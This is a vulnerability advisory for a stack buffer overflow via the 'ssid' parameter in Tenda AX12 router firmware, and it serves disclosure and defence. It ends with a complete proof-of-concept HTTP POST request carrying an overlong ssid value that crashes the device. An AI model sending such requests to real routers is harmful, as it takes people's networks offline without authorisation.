# Tenda router sub_431CF0 function stack overflow vulnerability

> vendor:Tenda
>
> product:AX12
>
> version:v1.0 v22.03.01.16
>
> type:Stack Overflow

## Vulnerability Description

Tenda AX12 v1.0 v22.03.01.16 were discovered to contain a stack overflow via the ssid parameter in the sub_431CF0 function.

## Vulnerability Details

In the function, V2 obtains the variable named "ssid" in the web request and passes it directly to the sprintf function without processing, which may cause a stack buffer overflow based on V19. Therefore, by requesting this page, an attacker can leverage crafted spill data to perform a denial of service attack.

![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/298a8e7b-a884-47b4-9e44-a3635f5f3947)
![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/406a80a4-10d3-4475-be0d-60027364e1c7)


## POC

    POST /goform/fast_setting_wifi_set HTTP/1.1
    Host: 192.168.244.130
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 1000
    Origin: http://192.168.244.130
    Connection: close
    Cookie: password=
    Referer: http://192.168.244.130/main.html

    ssid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
